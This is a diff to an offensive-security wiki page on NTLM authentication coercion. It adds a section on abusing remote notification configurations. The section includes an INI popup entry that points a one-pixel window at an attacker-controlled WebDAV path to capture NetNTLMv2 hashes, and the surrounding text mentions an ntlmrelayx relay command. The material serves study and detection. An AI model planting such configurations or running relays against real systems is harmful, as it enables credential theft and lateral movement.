@@ -184,6 +184,20 @@ ntlmrelayx.py -t smb://<TARGET> --http-port 80
 
 From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.<sup>[[9]](#references)[[11]](#references)</sup>
 
+### Remote notification URIs for WebDAV NTLM coercion
+
+If an application dereferences remotely configured popup or web-view addresses, a `file://` address can coerce outbound authentication **without a document open or executable payload**. In the AOMEI case, a one-pixel notification pointed to a remote `DavWWWRoot` WebDAV path. Windows attempted integrated authentication to that address, exposing a NetNTLMv2 challenge-response. The trigger was URI dereferencing, not popup visibility; it still depends on the application's URI handler, [Windows WebClient behavior](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution), and outbound authentication policy.<sup>[[16]](#references)</sup>
+
+```ini
+[PopWindow1]
+Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
+Width=1
+Height=1
+Priority=9999
+```
+
+Unlike the command-based coercion above, this entry point requires control of a [software notification configuration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). The one-pixel window and high priority show that an unobtrusive notification can still make the client dereference the URI.<sup>[[16]](#references)</sup>
+
 ### Office remote template injection (.docx/.dotm) to coerce NTLM
 
 Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.
@@ -235,3 +249,4 @@ README.md
 - [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
 - [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
 - [15] [HTB: Hercules — ODT external-object NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
+- [16] [Google Threat Intelligence Group and Mandiant – Investigating Ephemeral Supply Chain Tampering](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
